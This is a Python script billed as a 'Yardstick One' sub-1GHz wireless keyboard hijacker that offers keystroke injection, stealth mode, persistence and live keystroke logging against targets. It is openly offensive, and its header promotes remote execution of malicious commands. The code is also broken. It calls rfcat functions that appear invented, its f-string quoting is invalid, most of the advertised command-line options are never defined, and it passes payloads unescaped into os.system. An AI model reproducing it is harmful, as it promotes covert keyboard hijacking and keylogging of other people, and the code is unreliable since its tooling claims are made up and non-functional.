import argparse
import os
import time
import json

# -------------------------------------------
# Yardstick One - Sub-1GHz HID Keystroke Injector & MITM Tool
# -------------------------------------------
# Features:
# - Hijacks wireless keyboards operating on Sub-1GHz frequencies
# - Sends keystroke injection payloads wirelessly
# - Supports remote execution of malicious commands
# - Implements stealth mode for undetectable hijacking
# - Supports automated reconnection to ensure persistent access
# - Integrates with MITM attacks for live keystroke injection
# - Enables live keystroke logging for real-time monitoring
# - Detects automatic frequency hopping to track dynamic targets
# - Uses RF fingerprinting to identify and track specific devices
#
# Requirements:
# - Yardstick One (Y.S.O.) USB Dongle
# - Python 3.x
# - RFCat
# - Compatible wireless keyboard (e.g., Logitech non-Bluetooth RF keyboards)
#
# Usage:
# 1. Scan for wireless keyboards:
#    python yardstick_keystroke_hijacker.py --scan
# 2. Hijack a wireless keyboard:
#    python yardstick_keystroke_hijacker.py --hijack --target XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes remotely:
#    python yardstick_keystroke_hijacker.py --inject "Hello World"
# 4. Enable persistent hijacking mode:
#    python yardstick_keystroke_hijacker.py --persist --target XX:XX:XX:XX:XX:XX
# 5. Enable stealth mode:
#    python yardstick_keystroke_hijacker.py --stealth --target XX:XX:XX:XX:XX:XX
# 6. Run automated reconnection loop:
#    python yardstick_keystroke_hijacker.py --auto-reconnect --target XX:XX:XX:XX:XX:XX
# 7. Start live keystroke logging:
#    python yardstick_keystroke_hijacker.py --log-keystrokes --target XX:XX:XX:XX:XX:XX
# 8. Detect frequency hopping patterns:
#    python yardstick_keystroke_hijacker.py --detect-fh --target XX:XX:XX:XX:XX:XX
# 9. Identify and track devices using RF fingerprinting:
#    python yardstick_keystroke_hijacker.py --rf-fingerprint --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_wireless():
    """Scans for active wireless keyboards operating on Sub-1GHz."""
    print("[+] Scanning for wireless HID devices...")
    os.system("rfcat -r 'd.scan()' > wireless_scan_results.txt")
    print("[✔] Scan complete. Results saved to wireless_scan_results.txt")

def hijack_wireless(target):
    """Hijacks a wireless keyboard for keystroke injection."""
    print(f"[+] Hijacking wireless HID device {target}...")
    os.system(f"rfcat -r 'd.hijack("{target}")'")
    store_hijacked_device(target)
    print("[✔] Hijack successful. Device stored for persistent control.")

def store_hijacked_device(target):
    """Stores hijacked device information for later use."""
    hijacked_devices = load_hijacked_devices()
    if target not in hijacked_devices:
        hijacked_devices.append(target)
    with open("hijacked_wireless_devices.json", "w") as f:
        json.dump(hijacked_devices, f)

def load_hijacked_devices():
    """Loads previously stored hijacked devices."""
    try:
        with open("hijacked_wireless_devices.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def inject_keystrokes(payload):
    """Injects keystrokes remotely into a hijacked wireless keyboard."""
    print(f"[+] Injecting keystrokes: {payload}")
    os.system(f"rfcat -r 'd.inject("{payload}")'")
    print("[✔] Keystrokes injected successfully.")

def persist_control(target):
    """Maintains persistent hijacking of a wireless keyboard."""
    print(f"[+] Enabling persistence for {target}...")
    while True:
        os.system(f"rfcat -r 'd.reconnect("{target}")'")
        time.sleep(5)

def enable_stealth_mode(target):
    """Enables stealth mode to avoid detection while hijacking wireless keyboards."""
    print(f"[+] Enabling stealth mode for {target}...")
    os.system(f"rfcat -r 'd.stealth("{target}")'")
    print("[✔] Stealth mode enabled.")

def auto_reconnect(target):
    """Automates the reconnection process to maintain continuous hijacking."""
    print(f"[+] Running auto-reconnect for {target}...")
    while True:
        os.system(f"rfcat -r 'd.reconnect("{target}")'")
        time.sleep(3)

def log_keystrokes(target):
    """Logs keystrokes from a hijacked wireless keyboard in real time."""
    print(f"[+] Starting live keystroke logging for {target}...")
    os.system(f"rfcat -r 'd.log_keystrokes("{target}")' > keystroke_log.txt")
    print("[✔] Keystroke logging saved to keystroke_log.txt")

def detect_frequency_hopping(target):
    """Detects frequency hopping behavior for a target device."""
    print(f"[+] Detecting frequency hopping patterns for {target}...")
    os.system(f"rfcat -r 'd.detect_fh("{target}")' > fh_log.txt")
    print("[✔] Frequency hopping log saved to fh_log.txt")

def rf_fingerprint(target):
    """Identifies and tracks a device using RF fingerprinting."""
    print(f"[+] Capturing RF fingerprint for {target}...")
    os.system(f"rfcat -r 'd.rf_fingerprint("{target}")' > rf_fingerprint_log.txt")
    print("[✔] RF fingerprint log saved to rf_fingerprint_log.txt")

def main():
    parser = argparse.ArgumentParser(description="Yardstick One - Sub-1GHz HID Keystroke Injector & MITM Tool")
    parser.add_argument("--detect-fh", action='store_true', help="Detect frequency hopping on a target device")
    parser.add_argument("--rf-fingerprint", action='store_true', help="Identify and track devices using RF fingerprinting")
    parser.add_argument("--target", type=str, help="Target wireless HID device MAC address")
    args = parser.parse_args()

    if args.detect_fh and args.target:
        detect_frequency_hopping(args.target)
    elif args.rf_fingerprint and args.target:
        rf_fingerprint(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()